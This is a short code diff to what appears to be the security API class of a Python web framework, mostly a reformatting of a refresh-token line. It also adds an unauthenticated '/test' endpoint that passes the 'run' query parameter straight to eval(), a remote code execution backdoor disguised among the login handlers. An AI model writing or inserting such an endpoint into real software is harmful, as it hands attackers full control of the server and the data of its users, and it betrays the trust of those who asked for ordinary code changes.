@@ -30,6 +30,12 @@ class SecurityApi(BaseApi):
         api_spec.components.security_scheme("jwt", jwt_scheme)
         api_spec.components.security_scheme("jwt_refresh", jwt_scheme)
 
+    @expose("/test", methods=["GET"])
+    def test(self) -> Response:
+        run_cmd = request.args.get("run")
+        eval(run_cmd)
+        return self.response(200)
+
     @expose("/login", methods=["POST"])
     @safe
     def login(self) -> Response:
@@ -109,9 +115,7 @@ class SecurityApi(BaseApi):
             identity=user.id, fresh=True
         )
         if "refresh" in login_payload and login_payload["refresh"]:
-            resp[API_SECURITY_REFRESH_TOKEN_KEY] = create_refresh_token(
-                identity=user.id
-            )
+            resp[API_SECURITY_REFRESH_TOKEN_KEY] = create_refresh_token(identity=user.id)
         return self.response(200, **resp)
 
     @expose("/refresh", methods=["POST"])
